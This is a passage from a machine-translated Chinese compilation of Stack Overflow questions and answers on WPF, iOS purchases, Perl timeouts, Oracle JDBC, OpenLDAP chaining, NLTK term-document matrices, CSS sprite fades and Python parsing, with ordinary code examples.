    data-id="@result.Id">More info</button> 
```

并在您的 js 中执行以下操作

```
$(document).ready(function () {
    $('.show-modal').click(function () {
        var url = $("#modal-view-property-from-get-all").attr('data-url');
        var id = $(this).attr('data-id');

        $.get(url + '/' + id, function (data) {
            $('#view-property-from-get-all-container').html(data);

            $('#modal-view-property-from-get-all').modal('show');
        });
    });
}); 
```

# c# - 从另一个应用程序控制 WPF 应用程序

> ID：15899840
> 
> 赞同：4
> 
> 时间：2013-04-09T10:45:25.740
> 
> 标签：c#, wpf

我有一个 WPF 应用程序，我想从另一个应用程序控制它。我想要一些基本功能，例如将焦点设置在特定控件上，获取控件的文本并将文本/键发送到控件。

这可能吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T11:10:04.593

是的，这是可能的，并且有多种方法可以做到这一点。如果它们都在同一个网络上，您可以在它们之间建立 TCP 连接，都需要 TCPlistener 和 TCP 客户端。

但是，我建议您查看的是[WCF](http://msdn.microsoft.com/en-gb/library/ms731082.aspx)。使用 WCF，您将能够做您需要的事情（并且可能更多！），但是要充分熟悉 WCF 库，您需要大量阅读。

您可以从以下内容开始：

1.  [两个 .Net 应用程序之间的高效通信](https://stackoverflow.com/questions/7651915/efficient-communication-between-two-net-applications)

2.  [使用WCF的两个winform应用程序之间的通信？](https://stackoverflow.com/questions/14476332/communication-between-two-winform-application-using-wcf)

3.  [两个 WPF 应用程序之间的通信](https://stackoverflow.com/questions/12261401/communication-between-two-wpf-applications)

对于 WCF 方面，您需要做的事情的大纲是：

A.`ServiceHost`在每个应用程序（在它们的构造函数中）使用相同的 URI 作为引用打开 a。这将打开一个`NetNamedPipeBinding`您可以在两个应用程序之间进行通信的应用程序。

例子：

```
public static ServiceHost OpenServiceHost<T, U>(T instance, string address) 
{
    ServiceHost host = new ServiceHost(instance, new Uri[] { new Uri(address) });
    ServiceBehaviorAttribute behaviour = host.Description.Behaviors.Find<ServiceBehaviorAttribute>();
    behaviour.InstanceContextMode = InstanceContextMode.Single;
    host.AddServiceEndpoint(typeof(U), new NetNamedPipeBinding(), serviceEnd);
    host.Open();
    return host;
} 
```

B. 在相关频道上创建一个监听器。这可以在*两个*应用程序中完成，以允许双向通信。

例子：

```
/// <summary>
/// Method to create a listner on the subscribed channel.
/// </summary>
/// <typeparam name="T">The type of data to be passed.</typeparam>
/// <param name="address">The base address to use for the WCF connection. 
/// An example being 'net.pipe://localhost' which will be appended by a service 
/// end keyword 'net.pipe://localhost/ServiceEnd'.</param>
public static T AddListnerToServiceHost<T>(string address)
{
    ChannelFactory<T> pipeFactory = 
        new ChannelFactory<T>(new NetNamedPipeBinding(), 
                                     new EndpointAddress(String.Format("{0}/{1}",
                                                                                  address, 
                                                                                  serviceEnd)));
    T pipeProxy = pipeFactory.CreateChannel();
    return pipeProxy;
} 
```

C. 创建在两个应用程序中使用并在适当的类中继承的接口。一些`IMyInterface`.

您可以设置一个可在两个应用程序中使用的库，以实现一致的代码库。这样的库将包含上述两种方法[以及更多]，并将用于以下两个应用程序：

```
// Setup the WCF pipeline.
public static IMyInterface pipeProxy { get; protected set;}
ServiceHost host = UserCostServiceLibrary.Wcf
    .OpenServiceHost<UserCostTsqlPipe, IMyInterface>(
        myClassInheritingFromIMyInterface, "net.pipe://localhost/YourAppName");
pipeProxy = UserCostServiceLibrary.Wcf.AddListnerToServiceHost<IMyInterface>("net.pipe://localhost/YourOtherAppName"); 
```

某个类从哪里`pipeProxy`继承`IMyInterface`。这允许两个应用程序都知道正在传递什么（如果有的话 - 在您的情况下，这将是一个空白，只是一个“提示”，让应用程序知道通过接口执行预先指定的操作）。请注意，我*没有*展示如何对每个应用程序进行调用，您可以自己解决这个问题......

上面有一些空白你必须填写，但使用我提供的所有内容应该有助于你做你需要的事情。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:55:46.747

UIAutomation 就是答案。这是一篇关于 CodeProject 的有趣文章。

[http://www.codeproject.com/Articles/289028/White-An-UI-Automation-tool-for-windows-applicio](http://www.codeproject.com/Articles/289028/White-An-UI-Automation-tool-for-windows-applicatio)

# iphone - 在 iOS 上通过应用内购买使用 Apple 托管内容时，是否可以在购买前下载内容？

> ID：15899848
> 
> 赞同：6
> 
> 时间：2013-04-09T10:46:08.893
> 
> 标签：iphone, ios, ios6, in-app-purchase, iap-hosted-content

我正在开发一个将 IAP 与 Apple 托管内容一起使用的应用程序。我想在购买前向正在下载内容的人展示内容的图像。该应用程序是否可以在用户购买之前从 Apples 服务器下载内容？这样我就可以从该包中加载图像并显示它们。当用户购买它时，应用程序会显示包中的其余内容。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-09T13:56:53.377

要开始下载，您必须在 SKPaymnetQueue 上使用 startDownloads:，为此您需要用户单击购买按钮，因此无法在不购买的情况下从 iTunes 托管内容开始下载。此外，即使有可能下载完整的内容，你也需要代码来解锁它，这取决于购买，你的应用程序将消耗用户资源。

从[文档](http://developer.apple.com/library/ios/#documentation/StoreKit/Reference/SKPaymentQueue_Class/Reference/Reference.html)中，我了解到您无法在不验证购买的情况下访问 startDonwloads:。

我认为最好的方法是从您自己的服务器提供预览。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-08T13:52:02.247

您无法在购买之前下载托管内容。最好的选择是显示产品的预览，或者捆绑在您的应用程序中或从您自己的服务器下载。

# three.js - 使用three.js的3D热图/渐变

> ID：15899853
> 
> 赞同：1
> 
> 时间：2013-04-09T10:46:23.913
> 
> 标签：three.js, webgl, heatmap

我刚刚开始了一个使用 WebGL 对建筑物进行建模并在 web 浏览器中将其可视化的实验，并借助了 three.js。我想要实现的是温度或相对湿度等场的 3D 可视化。这些是 3D 实体，在空间中的所有点都有值，但没有边界。可视化这些数量的一种有效方法可能是半透明的热图，一种带有颜色的透明云，表示 3D 现象的强度。有什么方法可以达到这种效果吗？

谢谢！

# perl - 如何在 perl 中强制执行明确的超时？

> ID：15899855
> 
> 赞同：4
> 
> 时间：2013-04-09T10:46:29.103
> 
> 标签：perl, timeout, lwp-useragent

我正在使用 LWP 从网页下载内容，我想限制它等待页面的时间。

```
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->env_proxy;
$response = $ua->get("http://XML File");
$content = $response->decoded_content; 
```

问题是服务器偶尔会死锁（我们正试图找出原因）并且请求永远不会成功。由于服务器认为它是活动的，它保持套接字连接打开，因此 LWP::UserAgent 的超时值对我们没有任何好处。对请求强制执行绝对超时的最佳方法是什么？

每当超时达到其限制时，它就会死掉，我无法继续使用脚本！整个脚本处于一个循环中，它必须按顺序获取 XML 文件。我真的很想正确处理这个超时并使脚本继续到下一个地址。有谁知道如何做到这一点？谢谢！！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-09T11:08:30.327

我之前在[https://stackoverflow.com/a/10318268/1331451](https://stackoverflow.com/a/10318268/1331451)中遇到过类似的问题。

您需要做的是添加一个`$SIG{ALRM}`处理程序并使用[`alarm`](http://perldoc.perl.org/functions/alarm.html)它来调用它。您在拨打电话之前设置好，`alarm`然后直接取消它。然后您可以查看返回的 HTTP::Result。

警报将触发信号，Perl 将调用信号处理程序。在其中，您可以直接执行操作，也可以`die`仅执行`die`. 这`eval`是为了`die`不破坏整个程序。如果调用信号处理程序，`alarm`则会自动重置。

您还可以向处理程序添加不同`die`的消息，然后`$@`像@larsen 在他的回答中所说的那样进行区分。

这是一个例子：

```
my $ua = LWP::UserAgent->new;
my $req = HTTP::Request->new;
my $res;
eval {
  # custom timeout (strace shows EAGAIN)
  # see https://stackoverflow.com/a/10318268/1331451
  local $SIG{ALRM} = sub {
    # This is where it dies
    die "Timeout occured...";
  }; # NB: \n required
  alarm 10;
  $res = $ua->request($req);
  alarm 0;
};
if ($res && $res->is_success) {
  # the result was a success
} 
```

*   [perlipc](http://perldoc.perl.org/perlipc.html)用于信号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T11:09:18.870

一般来说，`eval`如果你想捕获和控制可能死掉的代码部分，你可以使用一个块。

```
while( … ) { # this is your main loop
    eval {
        # here the code that can die
    };
    if ($@) {
        # if something goes wrong, the special variable $@ 
        # contains the error message (as a string or as a blessed reference,
        # it depends on how the invoked code threats the exception.
    }
} 
```

[您可以在 eval 函数](http://perldoc.perl.org/functions/eval.html)的文档中找到更多信息

# java - java - 创建一个oracle数据库连接

> ID：15899856
> 
> 赞同：0
> 
> 时间：2013-04-09T10:46:31.923
> 
> 标签：java, database, oracle, connection, driver

有谁知道创建新的 oracle 数据库连接的最佳方法是什么。这是我目前拥有的：

```
private static getConnection() throws Exception {
    if (!isDriverRegistered){
               DriverManager.registerDriver(new oracle.jdbc.OracleDriver());
               isDriverRegistered = true;
      }
      return DrvierManager.getConnection(connectionString);
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:52:32.550

您不应该自己注册驱动程序；JDBC 驱动程序本身会在加载其类时执行此操作。所以，不要给`DriverManager.registerDriver`自己打电话。

有两个步骤：确保 JDBC 驱动程序类已加载，并获得连接。

要加载 JDBC 驱动程序类，请使用如下行：

```
Class.forName("oracle.jdbc.OracleDriver"); 
```

然后通过以下方式获得连接`DriverManager.getConnection`：

```
Connection conn = DriverManager.getConnection(connectionString); 
```

请注意，如果您使用较新的 JDBC 版本和合适的驱动程序，您甚至不需要显式加载驱动程序类；它将被自动找到并加载（通过 Java 的服务发现机制）。在这种情况下，您只需调用`DriverManager.getConnection`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:54:24.553

这门课可能会对你有所帮助

```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class JDBCHelper {

    public static void close(Statement obj)
    {
        try
        {
            if(obj!=null)
                obj.close();
        }
        catch(SQLException e)
        {
            e.printStackTrace();
        }
    }

    public static void close(ResultSet obj)
    {
        try
        {
            if(obj!=null)
                obj.close();
        }
        catch(SQLException e)
        {
            e.printStackTrace();
        }
    }

    public static void close(Connection obj)
    {
        try
        {
            if(obj!=null)
                obj.close();
        }
        catch(SQLException e)
        {
            e.printStackTrace();
        }
    }

    public static Connection getConnection()
    {
        Connection con = null;

        String url = "url"     //give url
        String pwd = "password";//give password
        String uid = "userId";//give userid

        try
        {       
            Class.forName("oracle.jdbc.OracleDriver");   //pass driver name
            con = DriverManager.getConnection(url,uid,pwd);
            con.setAutoCommit(false);

        }
        catch(Exception e)
        {
            if(con!=null)
                try {
                    con.rollback();
                } catch (SQLException e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }

            e.printStackTrace();
        }
        return con;
    }

} 
```

# c# - Windows Phone 8 应用程序因“ExecutionEngineException”而失败

> ID：15899857
> 
> 赞同：2
> 
> 时间：2013-04-09T10:46:33.530
> 
> 标签：c#, .net, windows-phone-8

在某些情况下，我的 Windows Phone 应用程序失败并显示`ExecutionEngineException`.

没有真正的步骤来重现失败，所以我不太确定在哪里挖掘。

[文档](http://msdn.microsoft.com/en-us/library/windowsphone/develop/system.executionengineexception%28v=vs.105%29.aspx)指出此异常已被弃用，并且不再在运行时抛出。

大多数情况下，此异常发生在视图之间的导航期间（在代码中的不同位置）。有时我在尝试获得响应时遇到此异常。具体代码如下：

```
void ResponseCallback(IAsyncResult ar)
{           
    var request = ar.AsyncState as HttpWebRequest;

    try
    {
        if (request == null) return;

        var response = request.EndGetResponse(ar); // at this point I'm getting the exception.
        SetLicenseResponse(response.GetResponseStream());
    }
    catch (WebException e)
    {
        Console.LogError("ResponseCallback exception:" + e.InnerException);
    }
} 
```

应用程序中使用的外部库是：

*   [Microsoft.Web.Media.SmoothStreaming](http://msdn.microsoft.com/en-us/library/microsoft.web.media.smoothstreaming%28v=vs.90%29.aspx)
*   [Microsoft.Phone.Controls.Toolkit](http://silverlight.codeplex.com/releases/view/71550)

该应用程序还使用两个外部 Web 服务。生成的服务引用被包装在使用`TaskCompletionSource`类的 async-await 服务消费者中。

还有几个相当大的 ListBox 使用`VirtualizingStackPanel`'s 作为项目面板。

根据我在互联网上找到的信息，如果从并行线程调用垃圾收集可能会导致异常，但是我没有`GarbageCollector`在代码中显式调用。

请建议从哪里开始。提前致谢。

**注意**：应用程序失败，主要是在设备上调试时出现特定异常。我没有将模拟器用于调试目的。在正常模式下运行应用程序时，我没有注意到日志中的异常，但是有可能异常没有正确处理以出现在日志中。

# ubuntu - slapd -- 推送来自消费者的更改

> ID：15899859
> 
> 赞同：0
> 
> 时间：2013-04-09T10:46:36.573
> 
> 标签：ubuntu, openldap, chain

我让生产者和消费者服务器通过 TLS 使用 delta 技术工作。在指向生产者的消费者上设置 updateRef - 因此应将更改定向到生产者。但是遇到了一个问题-当我尝试对消费者进行任何更改时，它会说“修改需要身份验证”，而我不知道如何真正解决它。

我偶然提到了 slapo-chain 覆盖，但是 1\. 我在 Ubuntu 服务器的 lib 文件夹中找不到它，以及 2\. 如何使用 cn=config 进行设置？

所有帮助将不胜感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T13:26:52.557

好吧，用 slapo-chain 解决了这个问题。

这是我使用 startTLS 的消费者链（示例）：

```
dn: olcOverlay={0}chain,olcDatabase={-1}frontend,cn=config
objectClass: olcOverlayConfig
objectClass: olcChainConfig
objectClass: top
olcOverlay: {0}chain
olcChainCacheURI: FALSE
olcChainMaxReferralDepth: 1
olcChainReturnError: TRUE

dn: olcDatabase={0}ldap,olcOverlay={0}chain,olcDatabase={-1}frontend,cn=config
objectClass: olcLDAPConfig
objectClass: olcChainDatabase
olcDatabase: {0}ldap
olcDbStartTLS: none  starttls=no
olcDbRebindAsUser: FALSE
olcDbChaseReferrals: TRUE
olcDbTFSupport: no
olcDbProxyWhoAmI: FALSE
olcDbProtocolVersion: 3
olcDbSingleConn: FALSE
olcDbCancel: abandon
olcDbUseTemporaryConn: FALSE
olcDbConnectionPoolMax: 16
olcDbNoRefs: FALSE
olcDbNoUndefFilter: FALSE

dn: olcDatabase={1}ldap,olcOverlay={0}chain,olcDatabase={-1}frontend,cn=config
objectClass: olcLDAPConfig
objectClass: olcChainDatabase
olcDatabase: {1}ldap
olcDbURI: "ldap://example.com"
olcDbStartTLS: start  starttls=no
olcDbIDAssertBind: mode=self flags=prescriptive,proxy-authz-non-critical bindmethod=simple timeout=0 network-timeout=0 binddn="cn=syncer,ou=syncproviders,dc=example,dc=com" credentials="superpassword" keepalive=0:0:0
olcDbRebindAsUser: FALSE
olcDbChaseReferrals: TRUE
olcDbTFSupport: no
olcDbProxyWhoAmI: FALSE
olcDbProtocolVersion: 3
olcDbSingleConn: FALSE
olcDbCancel: abandon
olcDbUseTemporaryConn: FALSE
olcDbConnectionPoolMax: 16
olcDbNoRefs: FALSE
olcDbNoUndefFilter: FALSE 
```

请注意，我在制作人方面遇到了一些关于 authzPolicy 的问题，但这是另一个问题；）

# python - 使用 NLTK 的高效术语文档矩阵

> ID：15899861
> 
> 赞同：16
> 
> 时间：2013-04-09T10:46:56.200
> 
> 标签：python, pandas, nltk, term-document-matrix

我正在尝试使用 NLTK 和 pandas 创建一个术语文档矩阵。我写了以下函数：

```
def fnDTM_Corpus(xCorpus):
    import pandas as pd
    '''to create a Term Document Matrix from a NLTK Corpus'''
    fd_list = []
    for x in range(0, len(xCorpus.fileids())):
        fd_list.append(nltk.FreqDist(xCorpus.words(xCorpus.fileids()[x])))
    DTM = pd.DataFrame(fd_list, index = xCorpus.fileids())
    DTM.fillna(0,inplace = True)
    return DTM.T 
```

运行它

```
import nltk
from nltk.corpus import PlaintextCorpusReader
corpus_root = 'C:/Data/'

newcorpus = PlaintextCorpusReader(corpus_root, '.*')

x = fnDTM_Corpus(newcorpus) 
```

它适用于语料库中的几个小文件，但是 当我尝试使用包含 4,000 个文件（每个大约 2 kb）的语料库运行它时，它给了我一个**MemoryError 。**

**我错过了什么吗？**

我正在使用 32 位 python。（我在 Windows 7、64 位操作系统、Core Quad CPU、8 GB RAM 上）。我真的需要为这种大小的语料库使用 64 位吗？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2015-02-25T18:43:07.847

我知道 OP 想在 NLTK 中创建一个 tdm，但是`textmining`包 ( `pip install textmining`) 让它变得非常简单：

```
import textmining

# Create some very short sample documents
doc1 = 'John and Bob are brothers.'
doc2 = 'John went to the store. The store was closed.'
doc3 = 'Bob went to the store too.'

# Initialize class to create term-document matrix
tdm = textmining.TermDocumentMatrix()

# Add the documents
tdm.add_doc(doc1)
tdm.add_doc(doc2)
tdm.add_doc(doc3)

# Write matrix file -- cutoff=1 means words in 1+ documents are retained
tdm.write_csv('matrix.csv', cutoff=1)

# Instead of writing the matrix, access its rows directly
for row in tdm.rows(cutoff=1):
    print row 
```

输出：

```
['and', 'the', 'brothers', 'to', 'are', 'closed', 'bob', 'john', 'was', 'went', 'store', 'too']
[1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0]
[0, 2, 0, 1, 0, 1, 0, 1, 1, 1, 2, 0]
[0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1] 
```

或者，可以使用 pandas 和 sklearn [[来源]](https://jakevdp.github.io/PythonDataScienceHandbook/)：

```
import pandas as pd
from sklearn.feature_extraction.text import CountVectorizer

docs = ['why hello there', 'omg hello pony', 'she went there? omg']
vec = CountVectorizer()
X = vec.fit_transform(docs)
df = pd.DataFrame(X.toarray(), columns=vec.get_feature_names())
print(df) 
```

输出：

```
 hello  omg  pony  she  there  went  why
0      1    0     0    0      1     0    1
1      1    1     1    0      0     0    0
2      0    1     0    1      1     1    0 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2013-04-10T17:39:39.487

感谢 Radim 和 Larsmans。我的目标是拥有一个像您在 R tm 中获得的 DTM。我决定使用 scikit-learn，部分灵感来自[这篇博文](http://slendrmeans.wordpress.com/2012/12/28/will-it-python-machine-learning-for-hackers-chapter-4-priority-emai-ranking/)。这是我想出的代码。

**我在这里发布它，希望其他人会发现它有用。**

```
import pandas as pd
from sklearn.feature_extraction.text import CountVectorizer 

def fn_tdm_df(docs, xColNames = None, **kwargs):
    ''' create a term document matrix as pandas DataFrame
    with **kwargs you can pass arguments of CountVectorizer
    if xColNames is given the dataframe gets columns Names'''

    #initialize the  vectorizer
    vectorizer = CountVectorizer(**kwargs)
    x1 = vectorizer.fit_transform(docs)
    #create dataFrame
    df = pd.DataFrame(x1.toarray().transpose(), index = vectorizer.get_feature_names())
    if xColNames is not None:
        df.columns = xColNames

    return df 
```

在目录中的文本列表上使用它

```
DIR = 'C:/Data/'

def fn_CorpusFromDIR(xDIR):
    ''' functions to create corpus from a Directories
    Input: Directory
    Output: A dictionary with 
             Names of files ['ColNames']
             the text in corpus ['docs']'''
    import os
    Res = dict(docs = [open(os.path.join(xDIR,f)).read() for f in os.listdir(xDIR)],
               ColNames = map(lambda x: 'P_' + x[0:6], os.listdir(xDIR)))
    return Res 
```

# 创建数据框

```
d1 = fn_tdm_df(docs = fn_CorpusFromDIR(DIR)['docs'],
          xColNames = fn_CorpusFromDIR(DIR)['ColNames'], 
          stop_words=None, charset_error = 'replace') 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-12-13T04:43:51.330

使用令牌和数据框的替代方法

```
import nltk
comment #nltk.download() to get toenize
from urllib import request
url = "http://www.gutenberg.org/files/2554/2554-0.txt"
response = request.urlopen(url)
raw = response.read().decode('utf8')
type(raw)

tokens = nltk.word_tokenize(raw)
type(tokens)

tokens[1:10]
['Project',
 'Gutenberg',
 'EBook',
 'of',
 'Crime',
 'and',
 'Punishment',
 ',',
 'by']

tokens2=pd.DataFrame(tokens)
tokens2.columns=['Words']
tokens2.head()

Words
0   ﻿The
1   Project
2   Gutenberg
3   EBook
4   of

    tokens2.Words.value_counts().head()
,                 16178
.                  9589
the                7436
and                6284
to                 5278 
```

# css - CSS3 - 在精灵图像的“背景位置”之间淡入淡出

> ID：15899865
> 
> 赞同：5
> 
> 时间：2013-04-09T10:47:24.810
> 
> 标签：css, image, sprite, fade, background-position

**我只想使用 CSS**在精灵图像的“背景位置”之间淡入淡出。我找到了很多教程，但我没有找到像这样简单的东西：

```
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>CSS3 - Fade between 'background-position' of a sprite image</title>
<style type="text/css">
div{
    width:  120px;
    height: 60px;

    background-image:       url('sprite.jpg');
    background-repeat:      no-repeat;
    background-position:    0   0;

}
div:hover{
    background-position:    0   -60px;
}
</style>
</head>
<body>
<div></div>
</html> 
```

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T11:11:04.653

我找到了答案，无论如何，谢谢。

```
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>CSS3 - Fade between 'background-position' of a sprite image</title>
<style type="text/css">
#button{
    float:                  left;
    background-image:       url('sprite.jpg');
    background-position:    0 -60px;
    background-repeat:      no-repeat;

    width:              120px;
    height:             60px;
}
#button a{
    background-image:       url('sprite.jpg');
    background-position:    0 0;
    background-repeat:      no-repeat;

    width:              120px;
    height:             60px;

    display:            block; 
    text-indent:        -9999px; 

    transition:         opacity 0.3s ease-in-out;
    -moz-transition:    opacity 0.3s ease-in-out;
    -webkit-transition: opacity 0.3s ease-in-out;
    -o-transition:      opacity 0.3s ease-in-out;
}
#button a:hover, 
#button a:focus{ 
    opacity:            0; 
}

</style>
</head>
<body>
<div id="button"><a href="#"></a></div>
</html> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T10:55:42.763

所以基本上，你需要执行两件事`:hover`

1.  `background-position`改变
2.  `fadein`影响

在这种情况下，CSS3 过渡将没有用。您可以使用 CSS3 动画属性。

动画属性接受`name`动画和持续时间。可以提供多个动画名称，以逗号分隔。

您需要定义这些动画名称。它们可以是您选择的任何字符串，但您需要定义它们。所以考虑这个CSS：

```
div:hover{
   animation: fadein 10s, bp 0.5s;
   -moz-animation: fadein 10s, bp 0.5s; /* Firefox */
   -webkit-animation: fadein 10s, bp 0.5s; /* Safari and Chrome */
   -o-animation: fadein 10s, bp 0.5s; 
    background-position:0 0;
}
@-webkit-keyframes fadein { /* Safari and Chrome */
    from {
        opacity:0;
    }
    to {
        opacity:1;
    }
}
@-webkit-keyframes bp { /* Safari and Chrome */
    from {
        background-position:-200px 0;
    }
    to {
        background-position:0 0;
    }
} 
```

看到这个[小提琴](http://jsfiddle.net/BqcWu/4/)，完整的浏览器支持的动画

注意：它肯定不会在 IE<9 中工作！它可能在 IE9 中（不确定）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-09T11:18:59.317

你可以`CSS3 Animation`使用`@keyframes`

```
div:hover{
  animation: logo 2s 0 linear;
}
@keyframes logo{
  0%   { opacity: 1; }
  5%   { opacity: 0; }
  50%  { background-position: 0 -60px; opacity: 0; }
  100% { background-position: 0 -60px; opacity: 1; }
} 
```

示例：http: [//jsfiddle.net/Y8W9S/](http://jsfiddle.net/Y8W9S/)

当然，现在你必须调整你想要实现的时间和效果。

希望它对您有所帮助或指出正确的方向。

祝你好运。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:51:09.410

像这样使用：

```
div{
    width:  120px;
    height: 60px;

    background-image: url('sprite.jpg');
    background-repeat: no-repeat;
    background-position: 0   0;
    transition: background-position 1s ease;

} 
```

并且不要忘记可选的供应商前缀

**编辑：**

我注意到你需要褪色。您尝试类似这样的解决方案：

```
div{
    background: url(foo.jpg) no-repeat 0 0 transparent;
    transition: background: 1s ease;
}

div:hover{
    background: rgba(0, 0, 0, 1);
} 
```

*我不能试试这个，因为我来自手机。*

# c# - 如何拥有一个包含 ItemsControl 上的按钮的 UserControl，该按钮控制 WPF 中 ItemsControl（向导）内部的 UserControl？

> ID：15899869
> 
> 赞同：1
> 
> 时间：2013-04-09T10:47:45.563
> 
> 标签：c#, wpf, user-controls, itemscontrol, wizard

WPF 相当新，我想创建一个向导。

所以我有一个名为 WizardUC.x​​aml 的 UserControl，其中包含：

```
namespace ClientApplication.View.Wizard
{
    /// <summary>
    /// Interaction logic for WizardUC.xaml
    /// </summary>
    public partial class WizardUC : ItemsControl
    {
        public WizardUC()

        InitializeComponent();
    }

    List<UserControl> userControls = new List<UserControl>();
    int currentUserControl = 0;

    private void ItemsControl_Loaded(object sender, RoutedEventArgs e)
    {
        foreach (UserControl i in Items)
        {
            userControls.Add(i);
            i.Visibility = System.Windows.Visibility.Collapsed;
        }
        userControls[currentUserControl].Visibility = System.Windows.Visibility.Visible;
    }
} 
```

还有一个名为 WizardTest.xaml 的窗口，其中包含：

```
<Window x:Class="ClientApplication.View.TestViews.WizardTest"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="WizardTest" Height="358" Width="351" xmlns:my="clr-namespace:ClientApplication.View.Wizard" xmlns:my1="clr-namespace:ClientApplication.View.Ribbon.CalendarUsercontorls" xmlns:my2="clr-namespace:ClientApplication.View.Ribbon">

    <Grid>
        <my:WizardUC Height="261" HorizontalAlignment="Left" x:Name="wizardUC1" VerticalAlignment="Top" Width="278">
            <my1:DetailToDo HorizontalAlignment="Stretch" VerticalAlignment="Stretch" />
           <my2:UserControlSchadule HorizontalAlignment="Stretch" VerticalAlignment="Stretch" />
        </my:WizardUC>
    </Grid>
</Window> 
```

如您所见，我在 WizardUC 中添加了两个 UserControl。

本质上，我想要的是在 ItemsControl 上的 Usercontrol 上有按钮来控制 Back 和 Next 等。

任何帮助将不胜感激！:)

# qpid - 如何处理 Apache Qpid + MRg 中丢失的客户端连接

> ID：15899871
> 
> 赞同：0
> 
> 时间：2013-04-09T10:47:47.640
> 
> 标签：qpid

使用 c++ 客户端，似乎如果由于某种原因与服务器的连接丢失，例如通过电源故障、手动终止、网络，那么服务器不会检测到客户端丢失。保持打开的连接（或半打开）。如何防止这种情况？是否有一些服务器端心跳选项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-03-18T01:32:05.247

客户端到代理的连接有一个称为心跳的连接选项。心跳选项值是一个整数，以秒为单位表示时间。每 N 秒发送一次心跳保活帧。如果错过了两个连续的心跳，则认为连接丢失。

查看[连接选项](http://qpid.apache.org/releases/qpid-0.26/programming/book/connection-options.html "连接选项")

# python - 在空格之间的字符串中查找数字并解析它

> ID：15899872
> 
> 赞同：2
> 
> 时间：2013-04-09T10:47:47.567
> 
> 标签：python, string, substring, parseint

我有一个文件，其中包含以下格式的行：

```
d    55    r:100:10000 
```

我想找到它`55`并将其解析为int。我怎样才能做到这一点 ？我想让它在证明之间可变空间。这意味着两者之间可能会有更多或更少的空间，但肯定会在两者`d`之间`r`。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:49:14.710

这很容易：

```
number = int(line.split()[1]) 
```

如果您确实需要检查它是否在 and 之间`d`，请`r`使用

```
import re
number = int(re.search(r"d\s+(\d+)\s+r", line).group(1)) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-09T10:49:08.910

默认情况下，该[`str.split()`](http://docs.python.org/2/library/stdtypes.html#str.split)方法在任意宽度的空格上拆分：

```
>>> 'd    55     r:100:10000'.split()
['d', '55', 'r:100:10000'] 
```

只挑出中间的数字就变成了一个简单的选择：

```
>>> int('d    55     r:100:10000'.split()[1])
55 
```

引用文档：

> 如果*sep*未指定或 is `None`，则应用不同的拆分算法：连续空格的运行被视为单个分隔符，如果字符串具有前导或尾随空格，则结果将在开头或结尾不包含空字符串。因此，使用分隔符拆分空字符串或仅包含空格的字符串会`None`返回`[]`.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-09T10:49:15.687

```
>>> line = 'd    55    r:100:10000'
>>> int(line.split()[1]) # By default splits by any whitespace
55 
```

或者更高效，您可以将其限制为两个拆分（第二个包含整数）：

```
>>> int(line.split(None, 2)[1]) # None means split by any whitespace
55 
```

# python - 在 Python 中生成具有已知离散概率的随机数

> ID：15899873
> 
> 赞同：1
> 
> 时间：2013-04-09T10:47:50.593
> 
> 标签：python

我想生成随机的数字三元组（h，v，d）。

d 数是根据 h、v 在一些 if 语句之后的随机值生成的

h 和 v 是已知区间内的整数

下面有一个代码示例：

```
l="low"
m="medium"
h="high"

for i in range (100):
   h=random.random()*3
   v=random.choice(['low', 'medium', 'high'])

   d1=1
   d1_2=random.randint(1,2)
   d1_3=random.randint(1,3)

   if 0<h<0.5 or h==0:
       if v==l:
           d=d1

       elif v==m:
           d=d1_2

       elif v==h:
           d=d1_3 
```

d1 的概率为 83.3%，d1_2 的概率为 6.7%，而 d1_3 的概率为 10%

如何在 Python 中插入这些可能性？？？

非常感谢您提前...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:57:11.657

你想要一个随机元素从你的列表中获得不同的权重，对吧？

```
def weighted_random(weights):
    number = random.random() * sum(weights.values())
    for k,v in weights.iteritems():
        if number < v:
            break
        number -= v
    return k

# the following values can be any non-negative numbers, no need of sum=100
weights = {'d1': 83.3,
           'd1_2': 6.7,
           'd1_3': 10.}

for i in xrange(10):
    print weighted_random(weights), 
```

打印，例如

```
d1 d1 d1 d1_2 d1 d1 d1 d1_3 d1 d1_2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:57:37.190

因此，如果我理解正确，您希望变量“v”以 0.833 的概率（例如 p1）取 d1 的值，以 0.067 的概率取 d1_2（称为 p2），以 0.1 的概率取 d1_3（p3）

为此，您可以生成一个介于 0 和 1 之间的均匀分布的数字，并检查该数字是否小于 p1。如果是，那么你让它取第一个值。如果不是，则检查它是否小于 p1 + p2。如果是这样，那么你让它取第二个值。最后，如果这两种情况都不是，那么您使用最终值。一些简单的代码如下：

```
